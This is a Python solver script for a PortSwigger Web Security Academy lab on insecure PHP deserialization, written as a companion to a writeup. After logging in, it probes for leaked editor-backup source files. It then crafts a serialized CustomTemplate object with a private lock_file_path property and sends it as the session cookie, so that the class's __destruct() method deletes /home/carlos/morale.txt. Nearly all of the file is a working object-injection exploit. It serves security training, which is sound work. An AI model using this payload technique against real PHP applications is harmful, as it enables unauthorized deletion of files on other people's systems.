#!/usr/bin/env python3
"""
Arbitrary object injection in PHP
PortSwigger Web Security Academy -- Insecure Deserialization

Companion script for the writeup: 04-arbitrary-object-injection-in-php.md

What this does:
    Confirms the source leak at /libs/CustomTemplate.php~ (an editor backup
    file served as plain text), then constructs a raw serialized
    CustomTemplate object from scratch -- a class the application never
    intended to appear in the session cookie -- with its private
    lock_file_path property pointed at /home/carlos/morale.txt. Private
    properties serialize as \\x00ClassName\\x00property_name, so the
    property-name length prefix has to include those two null bytes and the
    class name. Sending this as the session cookie makes unserialize()
    instantiate CustomTemplate; when it's garbage-collected, __destruct()
    fires unlink($this->lock_file_path) on our chosen path.

Usage:
    python 04-arbitrary-object-injection-in-php.py <lab-url>
    e.g. python 04-arbitrary-object-injection-in-php.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import base64
import re
import sys

import httpx


def _login(client: httpx.Client, base_url: str, username: str, password: str) -> str:
    login_page = client.get(f"{base_url}/login")
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', login_page.text)
    csrf = csrf_match.group(1) if csrf_match else None
    login_data = {"username": username, "password": password}
    if csrf:
        login_data["csrf"] = csrf
    client.post(f"{base_url}/login", data=login_data)
    return client.cookies.get("session")


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session = _login(client, lab_url, "wiener", "peter")
    if not session:
        print("[-] Login failed")
        return

    # Confirm the editor-backup source leak before building the payload.
    source_found = False
    for path in [
        "/libs/CustomTemplate.php~",
        "/libs/CustomTemplate.php.bak",
        "/libs/CustomTemplate.php.old",
        "/CustomTemplate.php~",
        "/cgi-bin/libs/CustomTemplate.php~",
    ]:
        r = client.get(f"{lab_url}{path}")
        if r.status_code == 200 and ("class" in r.text or "function" in r.text):
            print(f"[+] Found source at {path}")
            source_found = True
            break
    if not source_found:
        print("[!] No source code found -- using the known CustomTemplate payload anyway")

    # Private property encoding: \x00ClassName\x00property_name
    # \x00CustomTemplate\x00lock_file_path = 1 + 14 + 1 + 14 = 30 bytes
    target = b"/home/carlos/morale.txt"
    prop_name = b"\x00CustomTemplate\x00lock_file_path"
    payload = (
        b'O:14:"CustomTemplate":1:{s:'
        + str(len(prop_name)).encode()
        + b':"'
        + prop_name
        + b'";s:'
        + str(len(target)).encode()
        + b':"'
        + target
        + b'";}'
    )
    print(f"[*] Payload ({len(payload)} bytes): {payload!r}")

    # Base64-encode the raw bytes -- the literal null bytes have to survive
    # into the base64 input, not a string-escaped approximation of them.
    tampered_cookie = base64.b64encode(payload).decode()

    r = httpx.get(
        f"{lab_url}/my-account?id=wiener",
        headers={"Cookie": f"session={tampered_cookie}"},
        follow_redirects=True,
        timeout=15,
    )
    print(f"[*] Trigger request -> {r.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- morale.txt deleted via CustomTemplate.__destruct().")
    else:
        print("[-] Not solved yet -- __destruct() may not have fired on this request.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
